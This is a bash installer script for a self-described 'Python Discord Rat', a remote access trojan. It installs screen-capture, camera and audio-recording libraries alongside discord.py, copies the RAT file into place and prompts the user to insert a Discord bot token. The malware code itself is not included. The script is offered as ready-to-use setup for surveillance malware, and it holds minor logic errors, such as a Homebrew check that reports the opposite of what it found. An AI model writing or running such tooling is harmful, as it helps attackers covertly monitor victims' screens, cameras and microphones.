#!/bin/bash
set -e

echo "=========================================================="
echo "  AkiraDev7004s Installer - Installing Python Discord Rat"
echo "=========================================================="
echo ""

if ! command -v python3 &> /dev/null; then
    echo "[!] Python not found! Installing now..."
    echo ""
    
    if command -v apt-get &> /dev/null; then
        sudo apt update && sudo apt install -y python3 python3-pip python3-venv gcc
    elif command -v brew &> /dev/null; then
        echo "Homebrew not found. Please install Python manually:"
        echo "  https://www.python.org/downloads/"
        exit 1
    else
        echo "No package manager detected. Please install Python3 manually."
        exit 1
    fi
    
    echo ""
    echo "[OK] Python was installed!"
fi

echo ""
echo "========================================"
echo "  Creating Virtual Environment..."
echo "========================================"

python3 -m venv .venv

echo ""
echo "========================================"
echo "  Installing Dependencies..."
echo "========================================"

source .venv/bin/activate
pip install --upgrade pip

pip install discord.py mss cv2 sounddevice ordered-set zstandard

echo ""
echo "========================================"
echo "  Copying Bot Code..."
echo "========================================"

if [ -f rat.py ]; then
    echo "[OK] rat.py already found in directory."
elif [ -f "$HOME/Desktop/RAT.py" ]; then
    cp "$HOME/Desktop/RAT.py" .
    echo "[OK] RAT.py copied from Desktop."
fi

echo ""
echo "========================================"
echo "  Installation completed!"
echo "========================================"
echo ""
echo "To start the bot, enter:"
echo "  python rat.py"
echo ""
echo "Note: Open your rat.py first then change the bot token to your real token!"
echo ""

if [ -f token.txt ]; then
    echo "[INFO] Token was found in token.txt."
fi

exit 0
